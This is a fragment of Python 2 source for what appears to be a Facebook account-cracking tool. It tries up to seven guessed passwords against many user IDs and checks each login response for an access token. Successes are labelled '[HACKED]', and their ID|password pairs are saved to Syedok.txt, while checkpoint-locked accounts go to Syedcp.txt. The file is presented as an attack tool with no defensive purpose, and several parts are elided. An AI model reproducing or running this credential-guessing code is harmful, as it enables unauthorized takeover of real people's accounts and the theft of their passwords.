...
def main_select():
    ...
    if SYED == '':
        ...
        os.system('xdg-open https://www.instagram.com/BICP.Team.Help.Zone')
        main()
    elif SYED == '4':
        os.system('xdg-open https://facebook.com/BICP.Team.Help.Zone/')
        main()
    elif SYED == '0':
        os.system('exit')
    else:
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('Syedok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[MAHADI] ' + uid + ' | ' + pass1 + ' | ' + name
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('Syedok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[MAHADI] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Syedcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('Syedok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[MAHADI] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Syedcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('Syedok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[MAHADI] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Syedcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('Syedok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[MAHADI] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('Syedcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('Syedok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[MAHADI] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('Syedcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('Syedok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[MAHADI] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('Syedcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
    ...
    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: bicp.txt'
    print 54 * '_'
    print ''
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;93m[BICP] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('Syedcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;93m[BICP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Syedcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;93m[BICP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Syedcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[1;93m[BICP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Syedcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'access_token' in q:
                                ...
                                print '\x1b[1;93m[BICP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('Syedcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                                ...
                                if 'access_token' in q:
                                    ...
                                    print '\x1b[1;93m[BICP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('Syedcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        print '\x1b[1;93m[BICP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('Syedcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
